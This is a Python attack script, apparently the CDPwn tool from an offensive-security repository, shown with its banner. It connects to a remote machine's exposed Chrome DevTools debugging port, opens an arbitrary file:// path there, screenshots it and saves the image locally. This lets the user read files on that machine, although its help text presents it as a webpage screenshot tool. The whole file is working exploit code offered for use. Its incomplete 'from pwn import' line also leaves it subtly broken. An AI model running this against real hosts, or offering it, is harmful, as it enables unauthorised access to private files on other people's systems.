import argparse
import asyncio
import base64
from pycdp import cdp
from pycdp.asyncio import connect_cdp
from pwn import 

##
## https://github.com/offensive-security-pwncat/CDPwn
##

banner = """
            ;                                                            
            ED.                                                          
        .,  E#Wi                                           L.            
       ,Wt  E###G.        t                                EW:        ,ft
      i#D.  E#fD#W;       ED.                   ;          E##;       t#E
     f#f    E#t t##L      E#K:                .DL          E###t      t#E
   .D#i     E#t  .E#K,    E##W;       f.     :K#L     LWL  E#fE#f     t#E
  :KW,      E#t    j##f   E#E##t      EW:   ;W##L   .E#f   E#t D#G    t#E
  t#f       E#t    :E#K:  E#ti##f     E#t  t#KE#L  ,W#;    E#t  f#E.  t#E
   ;#G      E#t   t##L    E#t ;##D.   E#t f#D.L#L t#K:     E#t   t#K: t#E
    :KE.    E#t .D#W;     E#ELLE##K:  E#jG#f  L#LL#G       E#t    ;#W,t#E
     .DW:   E#tiW#G.      E#L;;;;;;,  E###;   L###j        E#t     :K#D#E
       L#,  E#K##i        E#t         E#K:    L#W;         E#t      .E##E
        jt  E##D.         E#t         EG      LE.          ..         G#E
            E#t                       ;       ;@                       fE
            L:                                                          ,
                                                    v1.0 Designed by кασѕ
                                                    Powered by PWNCAT S.L
"""

print(banner)

# Parse command-line arguments
parser = argparse.ArgumentParser(description='Capture a screenshot of a webpage.')
parser.add_argument('-i', '--ip', type=str, required=True, help='The IP address to connect to.')
parser.add_argument('-p', '--port', type=int, required=True, help='The port to connect to.')
parser.add_argument('-f', '--file', type=str, required=True, help='The file to navigate to.')
parser.add_argument('-s', '--screenshot', type=str, default='screenshot.png', help='The name of the screenshot file.')
parser.add_argument('-d', '--delay', type=int, default=2, help='The delay in seconds before capturing the screenshot.')
args = parser.parse_args()

async def main(screenshot_name='screenshot.png'):

    log.info('Starting script')
    conn = await connect_cdp(f'http://{args.ip}:{args.port}')
    log.success(f'Connected to http://{args.ip}:{args.port}')

    log.info('Creating target')
    target_id = await conn.execute(cdp.target.create_target('about:blank'))
    log.success(f'Created target with ID: {target_id}')

    log.info('Connecting to session')
    target_session = await conn.connect_session(target_id)
    log.success('Connected to session')

    log.info('Enabling page')
    await target_session.execute(cdp.page.enable())
    log.success('Enabled page')

    log.info(f'Navigating to file {args.file}')
    await target_session.execute(cdp.page.navigate(f'file://{args.file}'))
    log.success(f'Navigated to file {args.file}')

    log.info(f'Waiting for {args.delay} seconds before capturing screenshot')
    await asyncio.sleep(args.delay)  # wait for specified delay

    log.info('Capturing screenshot')
    screenshot = await target_session.execute(cdp.page.capture_screenshot())
    log.success('Captured screenshot')

    log.info('Decoding screenshot')
    decoded_screenshot = base64.b64decode(screenshot)
    with open(screenshot_name, 'wb') as file:
        file.write(decoded_screenshot)
    log.success(f'Saved screenshot as {screenshot_name}')

    log.info('Closing connection')
    await conn.close()
    log.success('Closed connection')

asyncio.run(main())
